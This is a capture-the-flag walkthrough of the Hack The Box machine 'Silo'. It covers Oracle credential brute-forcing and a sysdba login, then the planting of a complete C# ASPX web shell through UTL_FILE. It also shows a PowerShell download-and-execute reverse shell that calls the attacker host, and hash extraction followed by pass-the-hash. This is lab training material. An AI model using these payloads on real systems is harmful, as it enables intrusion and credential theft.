# Hack The Box - Silo Walkthrough w/o Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ sudo nmap -sC -sV -O -oA nmap/initial 10.10.10.82
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-09 00:27 EST
WARNING: RST from 10.10.10.82 port 80 -- is this port really open?
Nmap scan report for 10.10.10.82
Host is up (0.29s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
8080/tcp  open  http         Oracle XML DB Enterprise Edition httpd
|_http-title: 400 Bad Request
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=XDB
|_http-server-header: Oracle XML DB/Oracle Database
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/9%OT=80%CT=1%CU=39203%PV=Y%DS=2%DC=I%G=Y%TM=63E484CD
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=DD%GCD=1E%ISR=104%CI=I%II=I%TS=7)SEQ(SP=10
OS:0%GCD=1%ISR=108%TI=RD%CI=I%II=I%TS=7)OPS(O1=M537NW8ST11%O2=M537NW8ST11%O
OS:3=M537NW8NNT11%O4=M537NW8ST11%O5=M537NW8ST11%O6=M537ST11)WIN(W1=2000%W2=
OS:2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M537NW8N
OS:NS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R
OS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=
OS:80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-02-09T05:29:42
|_  start_date: 2023-02-09T05:26:20
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
                                                                                                                                                                                                                                                                                                                            
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.71 seconds
```

We get back the following result showing that there are around 13 ports are open:
- Port `80`: running `Microsoft IIS httpd 8.5`.
- Port `135`: running `Microsoft Windows RPC`.
- Port `139`: running `Microsoft Windows netbios-ssn`.
- Port `445`: running `Microsoft Windows Server 2008 R2 - 2012 microsoft-ds`
- Port `1521`: running `Oracle TNS listener 11.2.0.2.0`
- Port `8080`: running `Oracle XML DB Enterprise Edition httpd` 
- Ports `49152`, `49153`, `49154`, `49155`, `49160`, `49161`: running `Microsoft Windows RPC`


Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ rustscan -a 10.10.10.82 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.82:80
Open 10.10.10.82:135
Open 10.10.10.82:139
Open 10.10.10.82:445
Open 10.10.10.82:1521
Open 10.10.10.82:5985
Open 10.10.10.82:8080
Open 10.10.10.82:47001
Open 10.10.10.82:49152
Open 10.10.10.82:49153
Open 10.10.10.82:49160
Open 10.10.10.82:49154
Open 10.10.10.82:49155
Open 10.10.10.82:49159
Open 10.10.10.82:49162
Open 10.10.10.82:49161
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 80,135,139,445,1521,5985,8080,47001,49152,49153,49160,49154,49155,49159,49162,49161 10.10.10.82

Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-09 00:30 EST
Initiating Ping Scan at 00:30
Scanning 10.10.10.82 [2 ports]
Completed Ping Scan at 00:30, 0.12s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:30
Completed Parallel DNS resolution of 1 host. at 00:30, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 00:30
Scanning 10.10.10.82 [16 ports]
Discovered open port 135/tcp on 10.10.10.82
Discovered open port 80/tcp on 10.10.10.82
Discovered open port 8080/tcp on 10.10.10.82
Discovered open port 445/tcp on 10.10.10.82
Discovered open port 139/tcp on 10.10.10.82
Discovered open port 1521/tcp on 10.10.10.82
Discovered open port 49159/tcp on 10.10.10.82
Discovered open port 47001/tcp on 10.10.10.82
Discovered open port 49162/tcp on 10.10.10.82
Discovered open port 49161/tcp on 10.10.10.82
Discovered open port 49154/tcp on 10.10.10.82
Discovered open port 49160/tcp on 10.10.10.82
Discovered open port 5985/tcp on 10.10.10.82
Discovered open port 49152/tcp on 10.10.10.82
Discovered open port 49155/tcp on 10.10.10.82
Discovered open port 49153/tcp on 10.10.10.82
Completed Connect Scan at 00:30, 0.65s elapsed (16 total ports)
Nmap scan report for 10.10.10.82
Host is up, received syn-ack (0.32s latency).
Scanned at 2023-02-09 00:30:19 EST for 1s

PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
1521/tcp  open  oracle       syn-ack
5985/tcp  open  wsman        syn-ack
8080/tcp  open  http-proxy   syn-ack
47001/tcp open  winrm        syn-ack
49152/tcp open  unknown      syn-ack
49153/tcp open  unknown      syn-ack
49154/tcp open  unknown      syn-ack
49155/tcp open  unknown      syn-ack
49159/tcp open  unknown      syn-ack
49160/tcp open  unknown      syn-ack
49161/tcp open  unknown      syn-ack
49162/tcp open  unknown      syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.83 seconds
```

## Enumeration
Visiting port `80`, I found a default IIS page:

![s-1](https://user-images.githubusercontent.com/87711310/217728072-45fd2534-0314-41a3-ac0f-5965c434c8ba.png)

So, I ran `gobuster` to enumerate directories, but it didnt find anything cause all the directories `gobuster` found was jsut gibberish.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ gobuster dir -u http://10.10.10.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html -t 30
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.82/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,html
[+] Timeout:                 10s
===============================================================
2023/02/09 00:44:32 Starting gobuster in directory enumeration mode
===============================================================
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/http%3A              (Status: 400) [Size: 3420]
/q%26a                (Status: 400) [Size: 3420]
/**http%3a            (Status: 400) [Size: 3420]
/*http%3A             (Status: 400) [Size: 3420]
/**http%3A            (Status: 400) [Size: 3420]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]
/s%26p                (Status: 400) [Size: 3420]
/%3FRID%3D2671        (Status: 400) [Size: 3420]
/devinmoore*          (Status: 400) [Size: 3420]
/200109*              (Status: 400) [Size: 3420]
/*sa_                 (Status: 400) [Size: 3420]
/*dc_                 (Status: 400) [Size: 3420]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3420]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3420]                
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3420]                   
/http%3A%2F%2Fradar   (Status: 400) [Size: 3420]                                                           
/q%26a2               (Status: 400) [Size: 3420]                                                           
/login%3f             (Status: 400) [Size: 3420]                                                           
/Shakira%20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3420]                                        
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3420]                                                  
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3420]                                                           
/http%3A%2F%2Fswik    (Status: 400) [Size: 3420]                                                           
                                                                                                           
===============================================================
2023/02/09 01:38:06 Finished
===============================================================
```

Now, there was interesting port `1521` open which was running `Oracle` database, I decided to enumerate it next.

Also, this was my first time exploiting an Oracle database and I knew nothing about it.

After googling for a while, I found:

### Setup
1. To interact with `Oracle` from our Kali box, there are three tools that can come in handy. `sqlplus` is required for `odat` to work properly:

```
sudo apt install oracle-instantclient-sqlplus 
```

OR

download these three files from [github](https://github.com/bumpx/oracle-instantclient):
- basic
- sdk
- sqlplus

unzip them all into a Directory

update bashrc: 
```
alias sqlplus='/opt/oracle/instantclient_12_2/sqlplus'
export PATH=/root/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/didier:/usr/local/go/bin’
export SQLPATH=/opt/oracle/instantclient_12_2
export TNS_ADMIN=/opt/oracle/instantclient_12_2
export LD_LIBRARY_PATH=/opt/oracle/instantclient_12_2
export ORACLE_HOME=/opt/oracle/instantclient_12_2
```

2. Oracle Database Attacking Tool (ODAT)
- Download the release from [github](https://github.com/quentinhardy/odat/releases/)
- unzip in `/opt`
- add a line to `~/bashrc`: 
```
alias odat='export LD_LIBRARY_PATH=/opt/odat-libc2.5-i686/; cd /opt/odat-libc2.5-i686/; ./odat-libc2.5-i686; cd -'
```

OR you can just install it using the command line

```
sudo apt install odat
```

### Attack methodology

The first thing we need to enumerate is the `Oracle System ID (SID)` string. This is a string that is used to uniquely identify a particular database on a system. This can be done using the sidguesser module in ODAT.

```
python3 odat.py sidguesser -s 10.10.10.82 -p 1521

OR

odat sidguesser -s 10.10.10.82 -p 1521
```

This might take a while, but it does find a valid SID string: `XE`.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ odat sidguesser -s 10.10.10.82 -p 1521

[1] (10.10.10.82:1521): Searching valid SIDs                                                                                                                
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server
[+] 'XE' is a valid SID. Continue...                                    #################################################################  | ETA:  00:00:01 
100% |#####################################################################################################################################| Time: 00:03:32 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521)
100% |#####################################################################################################################################| Time: 00:00:07 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521)
[+] 'XE' is a valid SID. Continue...                                    ####################################################               | ETA:  00:00:20 
100% |#####################################################################################################################################| Time: 00:03:10 
[+] SIDs found on the 10.10.10.82:1521 server: XE
```

I wasnt sure if it was the only valid SID on tha database so I decided to run a check through metaspoilt.

```
msf6 auxiliary(admin/oracle/sid_brute) > run
[*] Running module against 10.10.10.82

[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'XE'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'PLSExtProc'
 [+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID 'CLRExtProc'
[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID ''
[*] 10.10.10.82:1521 - Done with brute force...
[*] Auxiliary module execution completed
```

You can skip metasploit's usage as we'll be using the `XE` PID for further enumeration which was found by `odat` tool too.

The second thing to do is enumerate valid credentials. This can be done using the passwordguesser module in ODAT. I tried both account files that come with the ODAT installation, however, the tool didn’t find any valid credentials. So instead, let’s locate the credential list that the Metasploit framework uses.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ locate oracle_default_userpass.txt
/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt
...
...
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt /opt/odat/accounts/

```

The username and passwords in this list are separated by a space instead of a forward slash (/). We’ll have to change it to forward slash so that the ODAT tool is able to parse the file. This can be done in vi using the following command.

```
:%s/ /\//g
```

Now that we have a proper list, we can use the `passwordguesser` module to brute force credentials.

```
odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file /opt/odat/accounts/oracle_default_userpass.txt
```

It takes a lot of time (approx 20 minutes), but gets us the results.

```
┌──(darshan㉿kali)-[/opt/odat]
└─$ sudo odat passwordguesser -s 10.10.10.82 -p 1521 -d XE --accounts-file /opt/odat/accounts/oracle_default_userpass.txt

[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521                                                                       
01:41:39 WARNING -: The line 'jl/jl/\n' is not loaded in credentials list: ['jl', 'jl', '']
01:41:39 WARNING -: The line 'ose$http$admin/invalid/password\n' is not loaded in credentials list: ['ose$http$admin', 'invalid', 'password']
The login brio_admin has already been tested at least once. What do you want to do:                                                        | ETA:  --:--:-- 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
a
The login brugernavn has already been tested at least once. What do you want to do:
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                             | ETA:  00:45:46 
[!] Notice: 'hr' account is locked, so skipping this username for password                                                                 | ETA:  00:39:36 
[!] Notice: 'mdsys' account is locked, so skipping this username for password                                                              | ETA:  00:26:46 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                             | ETA:  00:20:36 
[!] Notice: 'dip' account is locked, so skipping this username for password                                                                | ETA:  00:19:50 
[!] Notice: 'system' account is locked, so skipping this username for password#####                                                        | ETA:  00:12:42 
[!] Notice: 'xdb' account is locked, so skipping this username for password############################                                    | ETA:  00:07:50 
[!] Notice: 'outln' account is locked, so skipping this username for password##################################                            | ETA:  00:06:03 
[+] Valid credentials found: scott/tiger. Continue...                   #############################################################      | ETA:  00:01:06 
100% |#####################################################################################################################################| Time: 00:28:32 
[+] Accounts found on 10.10.10.82:1521/sid:XE: 
scott/tiger  
```

If you look at the [Oracle documentation](https://docs.oracle.com/cd/B19306_01/install.102/b15660/rev_precon_db.htm), the username/password that we found are actually one of the default credentials used when setting up Oracle. And that's the reason why its always adviced to try default credentials on login pages and databases. Now that we have a valid SID and username/password, let’s see if we can get code execution on the box.

Now that I found the credentials to the Oracle database, I tried to connect to the database using `sqlplus`:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ sqlplus SCOTT/tiger@10.10.10.82:1521/XE

SQL*Plus: Release 19.0.0.0.0 - Production on Thu Feb 9 02:18:37 2023
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> 
```

As soon as I was connected to the database, i looked for the databases but I guess there isn't any data.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ sqlplus SCOTT/tiger@10.10.10.82:1521/XE

SQL*Plus: Release 21.0.0.0.0 - Production on Thu Feb 9 03:19:19 2023
Version 21.9.0.0.0

Copyright (c) 1982, 2022, Oracle.  All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from session_privs;     

PRIVILEGE
----------------------------------------
CREATE SESSION
CREATE TABLE
CREATE CLUSTER
CREATE SEQUENCE
CREATE PROCEDURE
CREATE TRIGGER
CREATE TYPE
CREATE OPERATOR
CREATE INDEXTYPE

9 rows selected.

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO

SQL> 

```

But now, if you use `as sysdba` (typically as `sudo`) to login using the `sqlplus64` we get few more permissions.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Thu Feb 9 03:21:21 2023
Version 21.9.0.0.0

Copyright (c) 1982, 2022, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL> select * from session_privs;

PRIVILEGE
----------------------------------------
ALTER SYSTEM
AUDIT SYSTEM
CREATE SESSION
ALTER SESSION
...[snip]
ADMINISTER SQL MANAGEMENT OBJECT
ALTER PUBLIC DATABASE LINK
ALTER DATABASE LINK
FLASHBACK ARCHIVE ADMINISTER

208 rows selected.


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
...[snip]...
SYS                            XDB_WEBSERVICES_OVER_HTTP      YES YES NO
SYS                            XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO

32 rows selected.

```

This also allows us to do cool things like reading the files and if `java` is installed then it also allows us to run `java` files.

So, now, we declare a varible and write a program to read the `iisstart.htm` file

```
SQL> declare
  2    f utl_file.file_type;
  3    s varchar(200);
  4  begin
  5    f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');
  6    utl_file.get_line(f, s);
  7    utl_file.fclose(f); 
  8    dbms_output.put_line(s);
  9  end;
 10  /

PL/SQL procedure successfully completed.

```

Now, it didnt give any output, so I decided to turn on the `serveroutput` variable

```
SQL> set serveroutput ON
SQL> /
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

PL/SQL procedure successfully completed.
```

Running the program again, we see the beginning of the `HTML` file.

This means that we can actually read the files on the system.

Next, I tried to write files on the database.

```
declare
  f utl_file.file_type
  s varchar(500) := 'Hello';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'hello.txt', 'W');
  utl_file.put_line(f, s);
  utl_file.fclose(f);
end; 

```

Pasted the above code in the SQL terminal

```
SQL> declare
  f utl_file.file_type;
  s varchar(500) := 'Hello';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'hello.txt', 'W');
  utl_file.put_line(f, s);
  utl_file.fclose(f);
end;  2    3    4    5    6    7    8  
  9  /

PL/SQL procedure successfully completed.

```

And visited the `/hello.txt` on port `80`.

![s-2](https://user-images.githubusercontent.com/87711310/217783890-0bc2668c-af89-4ca5-b7b2-3f064cda8cfd.png)

So, now that I was able to write files on the system and run it, the next thing I was gonna do is to write and upload a web-shell.

```
declare
  f utl_file.file_type;
  s varchar(5000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg" runat="server" Width="250px"></asp:TextBox><asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'command.aspx', 'W');
  utl_file.put_line(f, s);
  utl_file.fclose(f);
end;
```

```
SQL> declare
  f utl_file.file_type;
  s varchar(5000) := '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("<pre>");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("</pre>");}</script><HTML><body ><form id="cmd" method="post" runat="server"><asp:TextBox id="txtArg" runat="server" Width="250px"></asp:TextBox><asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button><asp:Label id="lblText" runat="server">Command:</asp:Label></form></body></HTML>';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'command.aspx', 'W');
  utl_file.put_line(f, s);
  utl_file.fclose(f);
end;  2    3    4    5    6    7    8  
  9  /

PL/SQL procedure successfully completed.
```

Once, I got `procedure successfully completed`, I visited the `/commad.aspx` on port `80` and got back a web-shell.

![s-3](https://user-images.githubusercontent.com/87711310/217787861-08fe8998-e118-4401-9175-d9e25ba31c12.png)

I tried executing couple of basic commands to see if it was working properly. 

![s-4](https://user-images.githubusercontent.com/87711310/217788420-a710be3e-f77a-4955-8c79-6a0f687f6491.png)

I also did `whoami /all` and I saw that I had `SeImpersonatePrivilege` so the `rotten potato` would work on this.

But I decided not to use rotten potato and try and get a reverse shell using `nishang`.

```
┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/Silo/shells]
└─$ cp /opt/Windows/nishang/Shells/Invoke-PowerShellTcp.ps1 .

┌──(darshan㉿kali)-[~/…/HackTheBox/Windows-boxes/Silo/shells]
└─$ mv Invoke-PowerShellTcp.ps1 rev.ps1
```

Adding the following line at the end of the rev.ps1 file.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.x.x -Port 9999
```

Hosting the file using the `python http.server` command 
```
┌──(darshan㉿kali)-[/opt]
└─$ python3 -m http.server 8081
```

Using the powershell command to get the file on the server

```
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.x.x:8081/rev.ps1')"
```

Before hitting enter, I turned on my `netcat` listener, and once I hit enter, I get back a reverse shell on my machine.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.10.82] 49202
Windows PowerShell running as user SILO$ on SILO
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 
```

And I was able to grab the user flag.

```
PS C:\Users\Phineas\Desktop> type user.txt
[REDACTED]
```

## Privilege Escalation
Along with the `user flag`, there was a `Oracle issue.txt` file.

```
PS C:\Users\Phineas\Desktop> type "Oracle issue.txt"
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link 
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
?%Hm8646uC$
```

NOTE: The `?` in the password is actually a `£` symbol. So the correct password is `£%Hm8646uC$`

I visited the `Dropbox` link and entered the password.


![s-6](https://user-images.githubusercontent.com/87711310/217797335-e747abef-e924-46ee-8b5d-dd9107e5c3c3.png)

I found a zip file named `Silo`, so I was sure that this might be helpful in privilege escalation somehow. So, I downloaded the file, unzipped it and checked it out.


```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ mv /home/kali/Downloads/SILO-20180105-221806.zip .
                                                             
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ file SILO-20180105-221806.zip 
SILO-20180105-221806.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
                                                                         
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Silo]
└─$ unzip SILO-20180105-221806.zip 
Archive:  SILO-20180105-221806.zip
  inflating: SILO-20180105-221806.dmp 
```

Since it was a dump file, i had to install volatility and use it to dump its contents. First, I ran the basic imageinfo command.

```
┌──(root㉿kali)-[/opt/volatility_2.6_lin64_standalone]
└─# ./volatility -f /home/kali/Desktop/HackTheBox/Windows-boxes/Silo/SILO-20180105-221806.dmp imageinfo
```

Before further enumerating using `Volatility`, I decided to look at the OS name and OS version of the victim machine.

```
PS C:\Users\Phineas\Desktop> systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
```

Then, I ran the `kdbgscan` module from the volatility framework


```
┌──(root㉿kali)-[/opt/volatility_2.6_lin64_standalone]
└─# ./volatility kdbgscan -f /home/kali/Desktop/HackTheBox/Windows-boxes/Silo/SILO-20180105-221806.dmp 
Volatility Foundation Volatility Framework 2.6
**************************************************
Instantiating KDBG using: Unnamed AS Win2012R2x64_18340 (6.3.9601 64bit)
Offset (V)                    : 0xf80078520a30
Offset (P)                    : 0x2320a30
KdCopyDataBlock (V)           : 0xf8007845f9b0
Block encoded                 : Yes
Wait never                    : 0xd08e8400bd4a143a
Wait always                   : 0x17a949efd11db80
KDBG owner tag check          : True
Profile suggestion (KDBGHeader): Win2012R2x64_18340
Version64                     : 0xf80078520d90 (Major: 15, Minor: 9600)
Service Pack (CmNtCSDVersion) : 0
Build string (NtBuildLab)     : 9600.16384.amd64fre.winblue_rtm.
PsActiveProcessHead           : 0xfffff80078537700 (51 processes)
PsLoadedModuleList            : 0xfffff800785519b0 (148 modules)
KernelBase                    : 0xfffff8007828a000 (Matches MZ: True)
Major (OptionalHeader)        : 6
Minor (OptionalHeader)        : 3
KPCR                          : 0xfffff8007857b000 (CPU 0)
KPCR                          : 0xffffd000207e8000 (CPU 1)

**************************************************
...
```

The above mentioned profile works with other commands, so it seems to fit. After some playing around, the `Win2012R2x64` actually fits better, so we’ll work with that.

Volatility has a [long list of plugins](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference) we can use.

After a bunch of enumeration, found hashes in the `memory dump`. First we’ll need to get offsets for the registry hives in memory, and then we can use the `hashdump` plugin:

```
┌──(root㉿kali)-[/opt/volatility_2.6_lin64_standalone]
└─# ./volatility -f /home/kali/Desktop/HackTheBox/Windows-boxes/Silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump
Volatility Foundation Volatility Framework 2.6
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::
```

Now that I got the hashes, I can do a `Pass the Hash` attack using a pre-installed kali tool, `pth-winexe`

```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 //10.10.10.82 cmd
```

